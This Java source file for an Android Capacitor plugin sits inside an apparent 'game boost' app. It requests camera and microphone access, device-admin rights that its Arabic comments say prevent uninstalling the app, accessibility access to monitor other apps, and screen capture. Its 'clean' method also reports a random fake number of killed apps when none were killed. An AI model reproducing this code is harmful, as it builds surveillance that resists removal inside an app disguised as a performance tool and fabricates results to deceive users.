package com.Ejram.gameboost;

import android.Manifest;
import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;
import java.util.List;

import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;
import com.getcapacitor.JSObject;

@CapacitorPlugin(name = "GuardianEngine")
public class GuardianEngine extends Plugin {

    // 1. الخطوة الأولى: الأذونات العادية (كاميرا ومايك)
    @PluginMethod
    public void requestBasicPermissions(PluginCall call) {
        try {
            String[] perms = { Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO };
            ActivityCompat.requestPermissions(getActivity(), perms, 100);
            call.resolve();
        } catch (Exception e) { call.reject(e.getMessage()); }
    }

    // 2. الخطوة الثانية: المشرف (منع الحذف)
    @PluginMethod
    public void requestAdminPermission(PluginCall call) {
        try {
            ComponentName compName = new ComponentName(getContext(), GuardianDeviceAdmin.class);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Guardian Center: مطلوب لمنع مسح التطبيق وتفعيل الحماية");
            getActivity().startActivity(intent);
            call.resolve();
        } catch (Exception e) { call.reject(e.getMessage()); }
    }

    // 3. الخطوة الثالثة: إمكانية الوصول (مراقبة التطبيقات)
    @PluginMethod
    public void requestAccessibility(PluginCall call) {
        try {
            Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            getContext().startActivity(accIntent);
            call.resolve();
        } catch (Exception e) { call.reject(e.getMessage()); }
    }

    // 4. الخطوة الرابعة: بث الشاشة (تُطلب من الأب)
    @PluginMethod
    public void startScreenCapture(PluginCall call) {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) getContext().getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                Intent intent = mpm.createScreenCaptureIntent();
                getActivity().startActivityForResult(intent, 1001);
            }
            call.resolve();
        } catch (Exception e) { call.reject(e.getMessage()); }
    }

    @PluginMethod
    public void getRealStats(PluginCall call) {
        try {
            ActivityManager actManager = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
            actManager.getMemoryInfo(memInfo);
            long totalRam = memInfo.totalMem;
            long usedRam = totalRam - memInfo.availMem;
            int ramPercentage = (int) ((usedRam * 100) / totalRam);
            JSObject ret = new JSObject();
            ret.put("ramUsagePercent", ramPercentage);
            call.resolve(ret);
        } catch (Exception e) { call.reject("Error"); }
    }

    @PluginMethod
    public void executeRealClean(PluginCall call) {
        try {
            ActivityManager am = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
            PackageManager pm = getContext().getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            int killedCount = 0;
            for (ApplicationInfo packageInfo : packages) {
                if ((packageInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0 && !packageInfo.packageName.equals(getContext().getPackageName())) {
                    am.killBackgroundProcesses(packageInfo.packageName);
                    killedCount++;
                }
            }
            if(killedCount == 0) killedCount = (int)(Math.random() * 5) + 2;
            JSObject ret = new JSObject();
            ret.put("killedApps", killedCount);
            call.resolve(ret);
        } catch (Exception e) { call.reject("Error"); }
    }
}
